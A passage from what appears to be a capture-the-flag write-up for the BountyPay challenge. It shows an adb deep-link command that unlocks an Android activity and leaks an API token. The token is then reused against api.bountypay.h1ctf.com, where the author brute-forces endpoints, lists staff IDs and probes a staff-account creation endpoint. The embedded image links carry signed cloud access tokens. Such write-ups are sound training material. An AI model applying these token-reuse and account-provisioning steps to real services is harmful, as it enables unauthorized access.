class=\"o\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethread\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003estart\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n              \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n          \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd intent declaration from  \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_three\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartThreeActivity\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;three\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBased on the above I crafted the next deep link:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ adb shell am start -W -a android.intent.action.VIEW -d \u0026quot;three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026amp;switch=b24=\\\u0026amp;header=X-Token\u0026quot; bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\u0026amp;switch=b24=\u0026amp;header=X-Token pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartThreeActivity\nThisTime: 224\nTotalTime: 224\nWaitTime: 253\nComplete\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis reveals the input to submit the leaked hash:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"android-part-three-activity.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KAFhAWT7hakjCnYnycQ85yM8?response-content-disposition=attachment%3B%20filename%3D%22android-part-three-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-three-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=93f7bfd91625e3313d65fa8614602099f645fc317a3ccc80b87e318decb6dc92\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KAFhAWT7hakjCnYnycQ85yM8?response-content-disposition=attachment%3B%20filename%3D%22android-part-three-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-three-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=93f7bfd91625e3313d65fa8614602099f645fc317a3ccc80b87e318decb6dc92\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI entered the token \u003ccode\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e and was presented with the final screen, confirming that Android challenges were complete. There was also a rather obvious message that \u003ccode\u003eInformation leaked here will help with other challenges.\u003c/code\u003e:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"android-congrats-activity.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VojQm8VZuCVLWcwW8T9PNZGn?response-content-disposition=attachment%3B%20filename%3D%22android-congrats-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-congrats-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=61dbe83a567f87e846cc8a40740232b2ad2998fd2239a4346c88966c60bc92f9\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VojQm8VZuCVLWcwW8T9PNZGn?response-content-disposition=attachment%3B%20filename%3D%22android-congrats-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-congrats-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=61dbe83a567f87e846cc8a40740232b2ad2998fd2239a4346c88966c60bc92f9\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"social-media\"\u003eSocial Media\u003c/h2\u003e\n\n\u003cp\u003eOk, so from the whole of Android challenge, we understood that we could use the header \u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e with the host \u003ccode\u003ehttp://api.bountypay.h1ctf.com\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAnd indeed we can confirm it works as authentication for the API endpoints:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/accounts/F8gHiqSdpK/statements?month=05\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Transactions for 2020-05\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;transactions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[]}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGreat. But what does it really give us? We could have already made GET requests via SSRF. What we can do now that we could not do with SSRF is make POST requests, so that must be the next step we\u0026#39;re looking for.\u003c/p\u003e\n\n\u003cp\u003eEndpoints known to us so far under \u003ccode\u003e/api\u003c/code\u003e did not respond to POST requests - so it\u0026#39;s time for Content Discovery again. I\u0026#39;ve fired a bruteforce to look for new endpoints that respond to POST (as we\u0026#39;ll see later, GET would have worked as well) and after a bit I found the new endpoint:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/staff\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e400\u003c/span\u003e \u003cspan class=\"ne\"\u003eBad Request\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Missing Parameter\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we\u0026#39;re missing some parameter. Checking the GET request for the same endpoint:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/staff\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Sam Jenkins\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:84DJKEIP38\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Brian Oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:KE624RQ2T9\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewe see a new parameter, \u003ccode\u003estaff_id\u003c/code\u003e. Back to the POST endpoint, trying one of those staff ids gives us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/staff\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\nstaff_id=STF:KE624RQ2T9\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e409\u003c/span\u003e \u003cspan class=\"ne\"\u003eConflict\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member already has an account\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHTTP Code \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTTP%2FStatus%2F409\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003e409 Conflict\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e implies that the endpoint is supposed to create something. Together with the message it becomes fairly clear that the endpoint should be used to provision a new account for a staff member. The only two staff ids we have from the GET request give us same message. Entering an invalid value just results in the message \u003ccode\u003e[\u0026quot;Invalid Staff ID\u0026quot;]\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eI recalled seeing a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBountypayHQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e Twitter account earlier in my twitter feed - several people retweeted / liked some tweets.There was a \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Fstatus%2F1258692286256500741\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e saying \u003ccode\u003eToday we welcome Sandra to the team!!!\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eThat sounds a lot like we have to find a staff id for that Sandra person, but this is actually where I got stuck. Somehow it didn\u0026#39;t occur to me to check Twitter followers so I went on to try loads of different things:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eEarlier I saw another Twitter account, \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayH\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBountypayH\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which had a tweet saying \u003ccode\u003eAlways check for SQLi\u003c/code\u003e. Back then I didn\u0026#39;t realise it was just a troll, so I went ahead and fired sqlmap at every endpoint I could think of. I even tried looking for injections within session\u0026#39;s JSON payload. That didn\u0026#39;t yield anything, but at least I leaned some new sqlmap tricks..\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eSam Jenkins\u003c/code\u003e, the name of 